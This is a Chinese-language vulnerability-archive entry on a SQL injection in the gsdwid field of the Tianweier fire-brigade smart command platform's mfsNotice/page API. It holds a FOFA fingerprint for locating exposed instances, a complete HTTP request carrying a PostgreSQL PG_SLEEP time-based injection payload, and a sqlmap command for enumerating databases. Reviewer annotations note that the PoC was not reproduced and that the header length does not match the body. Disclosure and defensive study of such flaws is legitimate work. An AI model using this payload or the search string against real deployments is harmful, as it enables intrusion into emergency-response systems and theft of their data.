---
source: "wy876 漏洞文库"
title: "天维尔消防智能指挥平台 mfsNotice/page query.gsdwid SQL注入"
product: "天维尔消防智能指挥平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "PostgreSQL PG_SLEEP；版本未知"
prerequisites: "请求无Cookie，鉴权待核"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ch6s7681pfvp2rws"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%A4%A9%E7%BB%B4%E5%B0%94%E6%B6%88%E9%98%B2/%E5%A4%A9%E7%BB%B4%E5%B0%94%E6%B6%88%E9%98%B2%E6%99%BA%E8%83%BD%E6%8C%87%E6%8C%A5%E5%B9%B3%E5%8F%B0API%E6%8E%A5%E5%8F%A3%E9%A1%B5%E9%9D%A2sql%E6%B3%A8%E5%85%A5.md"
fofa: "body=\"1997-2020 天维尔信息科技股份有限公司\""
fofa_unverified: "body="
id: "vw-13bd03c87fb524b81b299b5a"
entity_id: "ve-13bd03c87fb524b81b299b5a"
schema_version: "1"
---

# 天维尔消防智能指挥平台 mfsNotice/page query.gsdwid SQL注入

## 条目说明

- 对象与具体问题：天维尔消防智能指挥平台；mfsNotice/page query.gsdwid SQL注入
- 版本、配置及部署条件：PostgreSQL PG_SLEEP；版本未知
- 认证与权限前提：请求无Cookie，鉴权待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 天为与天维尔产品名不一致；JSON字段gsdwid为注入点，补厂商规范名
- Content-Length103远短于可见JSON，工具随机hgubmt字段无作用说明
- 只有3秒载荷/sqlmap枚举命令无实际时间对照与结果
- 补数据库/配置/修复范围，HTTP误标Java，消防系统不执行探测

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
天维尔消防智能指挥平台是一个采用先进的信息技术和通信技术的系统，能够快速准确地获取和处理突发事件的信息，实现对灾害现场的实时监控和指挥调度，有效提升应急救援工作的能力和水平。天为消防智能指挥平台存在一个漏洞，影响组件API接口中/mfsNotice/page文件的未知代码。通过操纵参数gsdwid可以导致SQL注入

## 二、影响版本
+ 天维尔消防智能指挥平台

## 三、资产测绘
+ fofa`body="1997-2020 天维尔信息科技股份有限公司"`
+ 特征

## 四、漏洞复现
```http
POST /twms-service-mfs/mfsNotice/page HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 103

{"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930')AND 5803=(SELECT 5803 FROM PG_SLEEP(3)) AND ('oJoi'='oJoi"},"hgubmt748n4":"="}
```

> 请求长度说明：原资料 Content-Length 为 103；保留原始标头；其数值未据实际请求体重新计算或验证。


SQLMAP命令

```java
python3 sqlmap.py -r payload.txt --technique=T --time-sec 3  --dbs -v 3 --level 5 --random-agent
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ch6s7681pfvp2rws>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
